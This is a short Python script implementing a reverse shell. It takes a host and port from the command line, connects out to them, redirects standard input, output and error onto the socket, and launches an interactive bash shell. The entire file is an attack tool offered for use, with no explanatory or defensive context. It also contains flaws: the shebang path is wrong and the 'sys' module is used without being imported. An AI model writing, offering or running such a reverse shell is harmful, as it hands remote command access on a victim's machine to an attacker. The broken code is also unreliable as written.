#!/bin/usr/python3

from os import dup2
from socket import socket, AF_INET, SOCK_STREAM
from subprocess import run

def get_mod_args():
    argVector = ["host", "port"]
    argCount = len(argVector)
    return argCount, argVector


def get_args():
    host = sys.argv[1]
    port = int(sys.argv[2])
    return host, port


def invalid_args_errMsg(argVector):
    args = ""
    for arg in argVector:
        args += " <" + arg + ">"
    errMsg = "Usage ./" + sys.argv[0] + args + "\n"
    return errMsg


def check_args(argCount, argVector):
    if len(sys.argv) != argCount+1:
        errMsg = invalid_args_errMsg(argVector)
        sys.stderr.write(errMsg)
        return 1
    else:
        return 0


def get_configs():
    argCount, argVector = get_mod_args()
    if check_args(argCount, argVector) == 0:
        host, port = get_args()
        return host, port
    sys.exit(0)

def reverse_shell(host, port):
    shellSocket = socket(AF_INET, SOCK_STREAM)
    shellSocket.connect((host,port))
    dup2(shellSocket.fileno(), 0)
    dup2(shellSocket.fileno(), 1)
    dup2(shellSocket.fileno(), 2)
    run(["/bin/bash", "-i"])
    return 0


def main():
    host, port = get_configs()
    reverse_shell(host, port)
    return 0

if __name__ == "__main__":
    main()
